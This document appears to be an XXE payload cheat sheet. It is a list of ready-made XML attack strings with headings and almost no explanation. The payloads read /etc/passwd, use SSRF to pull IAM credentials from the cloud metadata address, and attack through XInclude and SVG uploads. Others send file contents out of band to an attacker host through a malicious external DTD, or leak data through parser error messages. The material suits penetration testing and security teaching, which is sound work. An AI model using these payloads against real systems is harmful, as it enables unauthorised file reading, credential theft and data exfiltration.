### XXE to retrieve files

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck> 
```

### XXE to perform SSRF

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
### XXE using XInclude to retrieve files

```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### XXE trough SVG

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XXE via modified content type

Original:

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar 
```

Modified:

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo> 
```

### Blind XXE via Out-of-Band network

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]> 
```

### Blind XXE with out-of-band interaction via XML parameter entities

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
```

### Blind XXE using malicious external DTD

Malicious DTD:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate; 
```

Trigger vulnerability:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]> 
```

### Blind XXE to retrieve data via error messages

Malicious DTD:

```
<!ENTITY % x SYSTEM "file:///etc/passwd">
<!ENTITY % y "<!ENTITY &#x25; z SYSTEM 'file:///nonexistent/%x;'>">

%y;
%z;
```

Trigger vulnerability:

```
<!DOCTYPE hh [ <!ENTITY % e SYSTEM "https://web-attacker.com/exploit.dtd"> %e;]>
```

### Blind XXE verifying presence of file

If any errors show up it is because the file don't exist.

```
<!DOCTYPE xx [
<!ENTITY % x SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%x;]>
```

### Blind XXE triggering via internal DTD

```
<!DOCTYPE xx [
	<!ENTITY % x SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamso '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
		<!ENTITY &#x25; y "<!ENTITY &#x26;#x25; exf SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		&#x25;y;
		&#x25;exf;
	'>
	%x;
]> 
```

